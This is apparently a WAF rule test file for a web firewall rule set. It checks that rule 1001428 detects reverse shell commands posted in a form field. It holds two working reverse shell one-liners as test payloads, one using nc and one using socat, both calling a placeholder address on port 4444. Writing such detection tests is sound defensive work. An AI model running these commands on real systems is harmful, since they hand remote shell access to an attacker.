---
meta:
  author: "JiuZhang Security Team"
  description: "SH reverse shell nc/socat pipe to /bin/sh"
rule_id: 1001428
tests:
  - test_id: 1
    desc: "SH reverse shell nc/socat pipe to /bin/sh"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: POST
          port: 80
          uri: "/post"
          data: 'file=nc 10.0.0.1 4444 -e /bin/sh'
          version: HTTP/1.1
        output:
          log:
            expect_ids: [1001428]
  - test_id: 2
    desc: "SH reverse shell nc/socat pipe to /bin/sh"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: POST
          port: 80
          uri: "/post"
          data: 'file=socat TCP:10.0.0.1:4444 EXEC:/bin/sh'
          version: HTTP/1.1
        output:
          log:
            expect_ids: [1001428]
